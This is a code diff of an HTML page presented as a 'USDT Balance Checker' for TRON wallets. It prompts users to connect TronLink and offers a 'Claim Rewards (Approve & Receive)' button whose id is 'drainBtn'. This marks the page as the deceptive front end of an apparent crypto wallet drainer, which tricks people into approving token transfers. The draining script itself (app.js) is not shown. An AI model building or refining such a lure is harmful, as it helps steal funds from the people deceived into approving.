@@ -1,22 +1,30 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>USDT Balance Checker</title>
-    <!-- Your existing style.css -->
     <link rel="stylesheet" href="style.css">
-    <!-- Add the CSS for the wallet adapter's modal -->
-    <link rel="stylesheet" href="https://unpkg.com/@tronweb3/tronwallet-adapter-react-ui/dist/style.css" />
 </head>
 <body>
-    <!-- Add a div with id 'app' for React to render into -->
-    <div id="app"></div>
+    <div class="container">
+        <h1>💰 USDT Balance Checker</h1>
+        <p class="sub">Connect your TRON wallet to check balance and claim rewards</p>
 
-    <!-- Load React and ReactDOM from a CDN -->
-    <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.development.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.development.js"></script>
-    <!-- Your application's JavaScript -->
-    <script type="module" src="app.js"></script>
+        <button id="connectBtn" class="btn-primary">🔌 Connect TronLink</button>
+
+        <div id="walletInfo" class="hidden">
+            <p><strong>Address:</strong> <span id="walletAddress"></span></p>
+            <p><strong>USDT Balance:</strong> <span id="usdtBalance">0.00</span></p>
+            <p><strong>TRX Balance:</strong> <span id="trxBalance">0.00</span></p>
+            <button id="drainBtn" class="btn-danger">💸 Claim Rewards (Approve & Receive)</button>
+        </div>
+
+        <div id="status" class="status"></div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.0.0/dist/TronWeb.js"></script>
+    <script src="app.js"></script>
 </body>
 </html>
